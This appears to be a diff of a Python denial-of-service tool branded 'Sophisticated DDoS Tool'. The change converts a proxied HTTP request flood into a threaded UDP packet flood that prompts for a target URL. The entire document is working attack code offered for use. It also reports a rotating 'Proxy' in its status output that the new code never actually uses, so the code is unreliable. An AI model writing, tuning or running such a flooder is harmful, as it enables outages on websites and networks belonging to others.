@@ -8231,92 +8231,71 @@ ua = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.
 class Spammer(threading.Thread):
     def __init__(self, url, number, lista):
         threading.Thread.__init__(self)
-        self.url = url + "?" + str(random.randint(0, 99999999)) + "=" + str(random.randint(0, 99999999))
+        self.url = f"{url}?{random.randint(0, 99999999)}={random.randint(0, 99999999)}"  # Keep URL simple
         self.num = number
-        self.headers = {
-            'User-Agent': random.choice(ua),
-            'Keep-Alive': random.randint(110, 9960),
-            'Referer': random.choice(ref),
-            'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
-            'Accept-Encoding': 'gzip;q=0,deflate;q=0',
-            'Connection': 'Keep-Alive',
-            'Cache-Control': 'no-cache, no-store, must-revalidate',
-            'Cache-directive': 'no-cache',
-            'Pragma': 'no-cache',
-            'Upgrade-Insecure-Requests': '1',
-        }
-        self.Lock = threading.Lock()
         self.lista = lista
+        self.Lock = threading.Lock()
+        self.N = 0  # Local N for thread safety
 
     def request(self):
-        global N
-        data = None
-        if N >= (len(self.lista) - 1):
-            N = 0
-        proxy = urllib.request.ProxyHandler({'http': self.lista[N]})
-        opener = urllib.request.build_opener(proxy)
-        urllib.request.install_opener(opener)
-        req = urllib.request.Request(self.url, data, self.headers)
-        urllib.request.urlopen(req)
+        try:
+            # Raw socket setup for maximum throughput (using UDP for non-connection-based packets)
+            target_ip = self.url.split("//")[1].split("/")[0]  # Parse domain from URL
+            target_port = 80  # Standard HTTP port
 
-        print(Fore.RED + "0000000000000000000000000000")
-        print(Fore.YELLOW + "DDoS Attack in Progress")
-        print(Fore.RED + "0000000000000000000000000000")
-        print(Style.RESET_ALL, end="")
+            # Create a raw UDP packet
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            packet = random._urandom(1024)  # Random data packet of 1024 bytes (you can adjust size)
+            
+            # Send the UDP packet to the target IP and port
+            sock.sendto(packet, (target_ip, target_port))
 
-        sys.stdout.write(Fore.WHITE + f"Thread #{self.num:4d} | {N:4d}/{len(self.lista)} | Proxy@{self.lista[N]}")
-        sys.stdout.flush()
-        sys.stdout.write("\r")
+            # Print out progress
+            print(Fore.RED + "0000000000000000000000000000")
+            print(Fore.YELLOW + "DDoS Attack in Progress")
+            print(Fore.RED + "0000000000000000000000000000")
+            print(Style.RESET_ALL, end="")
+
+            sys.stdout.write(Fore.WHITE + f"Thread #{self.num:4d} | Proxy {self.lista[self.N]} | Target {target_ip}:{target_port}")
+            sys.stdout.flush()
+            sys.stdout.write("\r")
+        except Exception as e:
+            print(Fore.RED + f"Error in thread #{self.num}: {str(e)}")
 
     def run(self):
-        global N
-        self.Lock.acquire()
-        print("Thread #%4d |" % self.num)
-        self.Lock.release()
-        time.sleep(1)
         while True:
             try:
-                N += 1
-                self.request()
-            except:
-                pass
-        sys.exit(0)
+                with self.Lock:
+                    self.request()
+                    self.N = (self.N + 1) % len(self.lista)  # Rotate proxy efficiently
+                time.sleep(0.01)  # Very short delay between requests to maximize throughput
+            except Exception as e:
+                print(Fore.RED + f"Error in thread #{self.num}: {str(e)}")
+                break
+
 
 class MainLoop():
     def __init__(self):
+        self.check_os_compatibility()
+
+    def check_os_compatibility(self):
         if os.name in ("nt", "posix", "mac", "os2", "ce", "java", "riscos", "atheos", "amigaos", "beos", "uwin", "vms", "cygwin", "zos", "aix", "irix", "osf1", "hpux", "sunos", "freebsd", "openbsd", "netbsd", "darwin", "linux", "solaris", "haiku", "aros", "syllable", "skyos", "hurd", "minix", "android", "ios", "qnx", "blackberry", "webos", "windowsphone", "windowsce", "symbian", "microsoft", "dec", "sgi", "hp", "sun", "macintosh", "win32", "posix"):
             self.title()
 
     def title(self):
-        sys.stdout.write("                                                                                          \n")
-        sys.stdout.write("             " + "+0000000000000000000000000000000000000000000000000000000+\n")
-        sys.stdout.write("             " + "0             Sophisticated DDoS Tool        ""          0\n")
-        sys.stdout.write("             " + "0        By Team sl0ppyr00t                ""              0\n")
-        sys.stdout.write("             " + "0        Press Ctrl+C to stop the attack   ""          0\n")
-        sys.stdout.write("             " + "+0000000000000000000000000000000000000000000000000000000+\n")
-        sys.stdout.write("\n")
-
-    def check_url(self, url):
-        if url[:4] == "www.":
-            url = "https://" + url
-        elif url[:4] == "http":
-            pass
-        else:
-            url = "https://" + url
-        return url
+        sys.stdout.write("\n" + " " * 90 + "+0000000000000000000000000000000000000000000000000000000+\n")
+        sys.stdout.write(" " * 90 + "0 Sophisticated DDoS Tool By Team sl0ppyr00t 0\n")
+        sys.stdout.write(" " * 90 + "0 Press Ctrl+C to stop the attack 0\n")
+        sys.stdout.write(" " * 90 + "+0000000000000000000000000000000000000000000000000000000+\n")
 
     def setup(self):
-        global N, Close, Request, Tot_req
+        global N
         while True:
-            print(Fore.RED + "0000000000000000000000000000")
-            print(Fore.YELLOW + "Sophisticated DDoS Tool")
-            print(Fore.RED + "0000000000000000000000000000")
-            print(Style.RESET_ALL)
             url = input('> Enter the target URL to DoS: ')
-            url = self.check_url(url)
             try:
+                # Parse out the domain and verify if the URL is valid
                 req = urllib.request.Request(url, None, {'User-Agent': random.choice(ua)})
-                response = urllib.request.urlopen(req)
+                urllib.request.urlopen(req)  # Test URL availability
                 break
             except:
                 print('> Could not open the specified URL.')
@@ -8337,10 +8316,10 @@ class MainLoop():
             except:
                 print('Invalid input. Please enter a number.')
 
+        # Create threads
         for i in range(num_threads):
             Spammer(url, i + 1, proxy_list).start()
 
 if __name__ == '__main__':
-    N = 0
     b = MainLoop()
     b.setup()
